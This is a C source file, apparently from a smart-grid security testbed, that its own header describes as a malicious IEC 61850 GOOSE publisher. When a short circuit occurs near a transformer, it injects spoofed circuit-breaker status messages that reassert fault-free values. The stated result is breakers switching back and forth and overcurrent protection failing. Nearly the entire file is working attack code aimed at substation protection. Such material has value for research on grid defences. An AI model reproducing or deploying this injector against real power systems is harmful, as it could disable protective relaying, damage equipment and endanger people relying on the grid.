/*
 * goose_publisher_PIOC_8313
 
#####################################################################################################################################################

Malicious behaviour:

Network level: Except the benign behaviours, this malicious program will be also running and publishing GOOSE packets (with 1,4,16,64,256,1000ms HB) mal_Pub_XFMR2 (1001: close CB3_66KV, CB_XFMR2, open CB2_22KV) to physcial process (Simulink) when a short-circuit happens around XFMR2.

Physical process level:If a short circuit happens around transformer2, (CB3_66KV, CB_XFMR2, CB2_22KV) will be switching between closing and opening respectively. Overcurrent protection fails.

#####################################################################################################################################################
*/


#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>
#include <unistd.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

//#######Define the attack settings #########//

//The number of packets in one period
#define No_pkts all 
//The Heartbeat of injecting packets (milliseconds)
#define HB normal 

// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
    int HBnew; // the new HB when st changes
    int CBstval[4] = {1,0,0,1}; //current CBstval
    int PreCBstval[4] = {1,0,0,1}; //previous CBstval
    int FaultFree[4] = {1,0,0,1}; // CBstval when fault-free
    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x3102;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x0c;
	gooseCommParameters.dstAddress[5] = 0x02;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;

	/*
	* Create a new GOOSE publisher instance. As the second parameter the interface
	* name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	* is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	* stack_config.h is used.
	*/ 
	
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
	MmsValue* quality = MmsValue_newBitString(13); // Create bit-string with 13 0s

	if (publisher) {
	    GoosePublisher_setGoCbRef(publisher, "QUTZS_XFMR2PIOC/LLN0$GO$gcb_1");
	    GoosePublisher_setTimeAllowedToLive(publisher, 1100);    
	    GoosePublisher_setDataSetRef(publisher, "QUTZS_XFMR2PIOC/LLN0$DS_XFMR");
	    GoosePublisher_setGoID(publisher , "gcb_1");
	    GoosePublisher_setConfRev(publisher, 200);

	    while (1) {	    	
	    	LinkedList dataSetValues = LinkedList_create(); 	
	    	FILE *fp;
	    	int i;
	    	
	    	fp=fopen("/home/ray/Desktop/XFMR2 OverCur Prot/TripRecord/TripFromPLC.csv","r");
			for (i=0; i<4; i++) {
		    	fscanf(fp,"%d,", &CBstval[i]);
			}    
	    	fclose(fp);
			
			if (memcmp(PreCBstval,CBstval,sizeof(CBstval)) != 0) {  // Compare the previous values
				GoosePublisher_increaseStNum(publisher); //if CB status changes (current != previous), stNum+1
				memcpy(PreCBstval,CBstval,sizeof(CBstval));
				HBnew = 1; // set the new heartbeat to 1ms
			}    
	    	
	    	if (memcmp(FaultFree,CBstval,sizeof(CBstval)) != 0) {	// Compare the fault-free values
				for (i = 0; i <4; i++ ) {
					LinkedList_add(dataSetValues, MmsValue_newBoolean(FaultFree[i]));
					LinkedList_add(dataSetValues, quality); 
				}
				GoosePublisher_publish(publisher, dataSetValues);
				if (HBnew < 999) {
					Thread_sleep(HBnew); 
					HBnew = HBnew*4;	// Heartbeat times 4 each loop
				}
				else if (HBnew > 999) {
					Thread_sleep(1000);					
				}
			}
			else 
				Thread_sleep(50);
		    
			LinkedList_destroyStatic(dataSetValues);
		}
		GoosePublisher_destroy(publisher);
	}
	else {
		printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}
    	
}
